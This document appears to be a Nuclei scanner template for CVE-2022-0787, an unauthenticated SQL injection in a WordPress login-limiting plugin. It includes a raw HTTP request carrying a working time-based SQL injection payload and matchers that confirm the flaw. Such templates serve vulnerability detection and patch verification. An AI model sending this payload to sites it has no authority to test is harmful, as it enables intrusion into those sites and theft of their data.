id: CVE-2022-0787

info:
  name: Limit Login Attempts (Spam Protection) < 5.1 - SQL Injection
  author: theamanrawat
  severity: critical
  description: |
    The Limit Login Attempts (Spam Protection) WordPress plugin before 5.1 does not sanitise and escape some parameters before using them in SQL statements via AJAX actions (available to unauthenticated users), leading to SQL Injections.
  remediation: Fixed in version 5.1
  reference:
    - https://wpscan.com/vulnerability/69329a8a-2cbe-4f99-a367-b152bd85b3dd
    - https://wordpress.org/plugins/wp-limit-failed-login-attempts/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0787
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0787
    cwe-id: CWE-89
  metadata:
    max-request: 1
    verified: true
  tags: cve,cve2022,sqli,wordpress,wp-plugin,wp,wp-limit-failed-login-attempts

http:
  - raw:
      - |
        @timeout: 15s
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=WPLFLA_get_log_data&order[][column]=0&columns[][data]=(SELECT+7382+FROM+(SELECT(SLEEP(6)))ameU)

    matchers:
      - type: dsl
        dsl:
          - duration>=6
          - status_code == 200
          - contains(all_headers, "text/html")
          - contains(body, 'iTotalDisplayRecords')
        condition: and
# digest: 4b0a0048304602210090656cf685011b68efd7438f46dc0ac6c1dfd4e4e6c529bf07534826fe81d115022100b46e9bef3dec31f247b0913a73a55a732219d55015b550c9e56859f8b20a9b98:922c64590222798bb761d5b6d8e72950